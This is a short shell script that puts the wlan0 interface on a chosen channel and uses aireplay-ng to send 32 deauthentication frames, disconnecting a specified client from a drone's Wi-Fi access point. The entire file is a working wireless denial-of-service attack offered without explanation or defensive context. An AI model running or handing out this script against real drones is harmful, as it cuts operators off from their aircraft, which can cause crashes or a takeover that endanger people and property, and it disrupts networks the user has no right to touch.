#!/bin/sh

AIREPLAY=aireplay-ng
IWCONFIG=iwconfig
NUM_DEAUTH=32

DRONE=$1
CLIENT=$2
CHANNEL=$3

echo "Hopping onto channel $CHANNEL"
sudo $IWCONFIG wlan0 channel $CHANNEL

echo "Disconnecting client $CLIENT from drone $DRONE (channel $CHANNEL)"
sudo $AIREPLAY -0 $NUM_DEAUTH -a $DRONE -c $CLIENT wlan0
